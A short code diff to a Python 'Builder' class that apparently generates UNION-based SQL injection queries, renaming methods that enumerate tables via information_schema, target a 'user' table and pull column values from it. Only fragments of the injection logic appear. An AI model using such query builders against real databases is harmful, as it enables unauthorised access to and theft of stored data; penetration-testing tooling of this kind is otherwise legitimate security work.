@@ -45,8 +45,9 @@ class Builder:
 
         return injections 
 
-    def schema_union(self, num_cols, magic_col):
-        """ :num_cols:  Number of columns for UNION statement.
+    def tables(self, num_cols, magic_col):
+        """ Uses information_schema.columns to get tables in DB.
+            :num_cols:  Number of columns for UNION statement.
             :magic_col: Column number that is most visible, and therefore used for injection parameter.
             :returns:   Dict of strings with queries regarding information_schema.
         """
@@ -74,7 +75,7 @@ class Builder:
         a += self.delimiter + 'where' + self.delimiter + 'table_name=\'user\''
         return {'users' : a}
 
-    def values(self, num_cols, magic_col, table_name, col_names):
+    def rows(self, num_cols, magic_col, table_name, col_names):
         """ Build SQLI to get values of each column in a specified table.
             :num_cols:      Number of columns for UNION statement.
             :magic_col:     Column number that is most visible, and therefore used for injection parameter.
